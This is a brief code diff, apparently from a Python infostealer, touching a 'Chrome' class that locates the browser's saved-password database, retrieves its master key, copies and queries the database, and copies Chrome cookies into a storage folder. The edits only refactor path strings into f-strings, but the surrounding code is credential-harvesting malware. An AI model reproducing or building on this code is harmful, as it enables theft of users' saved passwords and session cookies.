@@ -64,9 +64,9 @@ class Chrome:
             if (path.exists(self.passwords_path)) is True:
 
                 master_key = self.__get_key()
-                shutil.copyfile(self.passwords_path, self.storage_path + "Chrome.db")
+                shutil.copyfile(self.passwords_path, f"{self.storage_path}Chrome.db")
 
-                with connect(self.storage_path + "Chrome.db") as connection:
+                with connect(f"{self.storage_path}Chrome.db") as connection:
 
                     cursor = connection.cursor()
 
@@ -80,7 +80,7 @@ class Chrome:
 
                 shutil.copyfile(self.cookies_path, f"{self.storage_path}{self.storage_folder}Chrome Cookies", follow_symlinks=True)
 
-            remove(self.storage_path + "Chrome.db")
+            remove(f"{self.storage_path}Chrome.db")
 
         except Exception as e:
             print(repr(e))
